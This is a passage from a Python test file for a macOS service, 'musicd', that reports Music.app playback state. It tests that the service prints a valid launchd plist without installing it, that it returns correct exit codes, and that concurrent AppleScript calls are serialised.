    must be granted to this specific parent process by hand, so `--install`
    prints and explains instead of bootstrapping — and the printed plist has to
    be a real one, because a plist with a typo fails silently under launchd.
    """
    import plistlib

    monkeypatch.setattr(musicd, "_tailnet_ipv4", lambda: "100.102.190.111")
    before = sorted(p.name for p in (Path.home() / "Library" / "LaunchAgents").glob("*")) \
        if (Path.home() / "Library" / "LaunchAgents").is_dir() else []

    assert musicd.install("", 8731) == 0
    out = capsys.readouterr().out

    start = out.index("<?xml")
    end = out.index("</plist>") + len("</plist>")
    parsed = plistlib.loads(out[start:end].encode("utf-8"))
    assert parsed["Label"] == musicd.LABEL
    assert "--serve" in parsed["ProgramArguments"]
    assert "100.102.190.111" in parsed["ProgramArguments"]
    assert musicd.WILDCARD not in parsed["ProgramArguments"]
    # App Nap and a non-GUI session both break Apple events.
    assert parsed["ProcessType"] == "Interactive"

    # The demonstration is the point, and "not-running must not equal stopped"
    # is the specific thing to demonstrate.
    assert "not-running" in out and "stopped" in out
    assert "Automation" in out

    after = sorted(p.name for p in (Path.home() / "Library" / "LaunchAgents").glob("*")) \
        if (Path.home() / "Library" / "LaunchAgents").is_dir() else []
    assert before == after, "--install wrote to LaunchAgents; it is supposed to print"


def test_once_exits_nonzero_only_when_it_could_not_tell(capsys, monkeypatch) -> None:
    """A shell caller needs the same three-way answer the HTTP client gets.

    Exiting 0 for `unknown` would make `musicd.py --once && ...` treat "I could
    not ask Music" as a successful reading, which is the whole inversion.
    Exiting non-zero for `not-running` would make a closed Music.app look like
    a broken service and page somebody.
    """
    monkeypatch.setattr(musicd, "run_osascript", fake_runner(RUNNING, osa_ok(GOOD)))
    assert musicd.once() == 0
    assert json.loads(capsys.readouterr().out)["track"] == "Bloom"

    monkeypatch.setattr(musicd, "run_osascript", fake_runner(NOT_RUNNING))
    assert musicd.once() == 0, "a closed Music.app is a determinate answer"
    assert json.loads(capsys.readouterr().out)["state"] == "not-running"

    monkeypatch.setattr(
        musicd, "run_osascript", fake_runner(RUNNING, osa_fail("osascript-timeout", "hung"))
    )
    assert musicd.once() == 1
    assert json.loads(capsys.readouterr().out)["reason"] == "osascript-timeout"


def test_concurrent_reads_do_not_interleave_two_conversations(monkeypatch) -> None:
    """Two osascript processes racing on Music.app is how you get a dialog.

    And a dialog is the hang every timeout in this file exists for. The lock
    also guarantees the liveness check and the state read of one request are
    not separated by another request's calls — which is what would let a
    request learn Music is running and then read state after it quit.
    """
    concurrent = 0
    peak = 0
    guard = threading.Lock()

    def run(script: str, timeout: float) -> Any:
        nonlocal concurrent, peak
        with guard:
            concurrent += 1
            peak = max(peak, concurrent)
        time.sleep(0.02)
        with guard:
            concurrent -= 1
        return RUNNING if "System Events" in script else osa_ok(GOOD)

    monkeypatch.setattr(musicd, "run_osascript", run)
    threads = [threading.Thread(target=lambda: request("GET", "/api/music")) for _ in range(6)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=30)

    assert peak == 1, f"{peak} osascript calls ran at once"
